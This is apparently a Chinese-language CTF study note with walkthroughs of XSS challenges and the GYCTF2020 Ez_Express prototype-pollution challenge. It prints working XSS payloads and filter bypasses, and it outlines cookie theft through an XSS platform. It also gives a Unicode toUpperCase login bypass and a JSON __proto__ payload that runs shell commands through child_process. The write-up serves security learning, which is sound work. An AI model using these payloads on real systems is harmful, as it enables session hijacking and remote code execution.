# JavaScript

## xss

XSS分为：存储型 、反射型 、DOM型

反射型： 服务器返回脚本，客户端执行（一般出现在URL中.

存储型： 多在评论区中出现。

DOM型： DOM型XSS无需和后端交互，而是**基于JavaScript上**，JS解析URL中恶意参数导致执行JS代码。



### BUU XSS COURSE1



![IMG_20230319_164243](D:\OneDrive\文档\Tencent Files\1339071002\FileRecv\MobileFile\IMG_20230319_164243.jpg)

输入<img src=1 onerror=alert(1)>

![IMG_20230318_191200](D:\OneDrive\文档\Tencent Files\1339071002\FileRecv\MobileFile\IMG_20230318_191200.jpg)

![IMG_20230318_191418](D:\OneDrive\文档\Tencent Files\1339071002\FileRecv\MobileFile\IMG_20230318_191418.jpg)

发现是xss漏洞。发现该网站只有登录，没有注册。这时需要用到xss平台来进行管理。

先创建一个项目，再找一个xss代码发在吐槽中，得到纪录。

![IMG_20230318_192104](D:\OneDrive\文档\Tencent Files\1339071002\FileRecv\MobileFile\IMG_20230318_192104.jpg)

再利用火狐插件EditThisCookie访问/admin.php并将cookie值输入。

![IMG_20230318_192029](D:\OneDrive\文档\Tencent Files\1339071002\FileRecv\MobileFile\IMG_20230318_192029.jpg)

再看原始数据得到flag

![IMG_20230318_192052](D:\OneDrive\文档\Tencent Files\1339071002\FileRecv\MobileFile\IMG_20230318_192052.jpg)

### xss lab

第一关非常简单，就是普通的xss漏洞。

第二关发先普通的<img src=1 onerror=alert(1)>不行

![1679216132541](D:\OneDrive\文档\Tencent Files\1339071002\FileRecv\MobileFile\1679216132541.jpg)

观察代码发现回显处的'<'和'>'被转码掉了，则需绕过过滤函数。需要将属性的引号和标签先闭合。

"><img src=1 onerror=alert(1)> 就ok了

第三关 先尝试一下，发现源代码中有‘且将<>给过滤了，这时需要使用特殊事件来执行js代码

![1679216614634](D:\OneDrive\文档\Tencent Files\1339071002\FileRecv\MobileFile\1679216614634.jpg)

' onclick='alert(1) 就ok了。

第四关与第三关类似，只需将'改为"就行。

第五关发现onclick被过滤了，之前的也被过滤了，这时采用其他标签来进行替换

"><a href="javascript:alert(1)"

![1679217169537](D:\OneDrive\文档\Tencent Files\1339071002\FileRecv\MobileFile\1679217169537.jpg)

发现搜索框与输入框中间有一个横线，点击就过了。

## 原型链漏洞

在 Javascript，每一个实例对象都有一个prototype属性，prototype 属性可以向对象添加属性和方法。
在 Javascript，每一个实例对象都有一个__proto__属性，这个实例属性 指向对象的原型对象(即原型)

可以通过以下方式访问得到某一实例对象的原型对象：

```javascript
objectname["__proto__"]
objectname.__proto__
objectname.constructor.prototype
```





## [GYCTF2020]Ez_Express

![1679219825914](D:\OneDrive\文档\Tencent Files\1339071002\FileRecv\MobileFile\1679219825914.jpg)

观察源代码可以得到

www.zip,访问即可下载，解压后得到文件，在routes中得到index.js即可得到源码

![IMG_20230319_143201](D:\OneDrive\文档\Tencent Files\1339071002\FileRecv\MobileFile\IMG_20230319_143201.jpg)

进行代码审计来找到解决用ADMIN登录的问题。

```javascript
function safeKeyword(keyword) {

 if(keyword.match(/(admin)/is)) {

   return keyword

 }



 return undefined

}
```

```javascript
 if(safeKeyword(req.body.userid)){
    res.end("<script>alert('forbid word');history.go(-1);</script>") 
   }
    req.session.user={
      'user':req.body.userid.toUpperCase(),
      'passwd': req.body.pwd,
      'isLogin':false
    }
```

发现这里用了一个toUpperCase()函数，这个是大写函数，他有一个漏洞，可以用特殊字符“ı"、"ſ"代替“i”和“s”。

 所以我们用ADMıN登录就可以了。

![IMG_20230319_162939](D:\OneDrive\文档\Tencent Files\1339071002\FileRecv\MobileFile\IMG_20230319_162939.jpg)

找到要用原型链的代码

```javascript
const merge = (a, b) => {
  for (var attr in b) {
    if (isObject(a[attr]) && isObject(b[attr])) {
      merge(a[attr], b[attr]);
    } else {
      a[attr] = b[attr];
    }
  }
  return a
} 
const clone = (a) => {
  return merge({}, a);
}
```

再找一下clone()在哪里被调用的，发现是在登录后的“/action”下才调用的，用上面的方法登录

```javascript
router.post('/action', function (req, res) {
  if(req.session.user.user!="ADMIN"){res.end("<script>alert('ADMIN is asked');history.go(-1);</script>")} 
  req.session.user.data = clone(req.body);
  res.end("<script>alert('success');history.go(-1);</script>");  
});
```

然后再找污染点

```javascript
router.get('/info', function (req, res) {
  res.render('index',data={'user':res.outputFunctionName});
})
```

在这两行代码中可以看到在/info下，使用将outputFunctionName渲染入index中，而outputFunctionName是未定义的，这里就可以用上了。

注册后先用burpsuite抓一下/action的包，然后将Content-Type的数据改为application/json，然后写入playload：{"lua":"123","__proto__":{"outputFunctionName":"t=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString()//"},"Submit":""}





![IMG_20230319_152028](D:\OneDrive\文档\Tencent Files\1339071002\FileRecv\MobileFile\IMG_20230319_152028.jpg)

最后访问/info就可以得到flag。

![IMG_20230319_152055](D:\OneDrive\文档\Tencent Files\1339071002\FileRecv\MobileFile\IMG_20230319_152055.jpg)

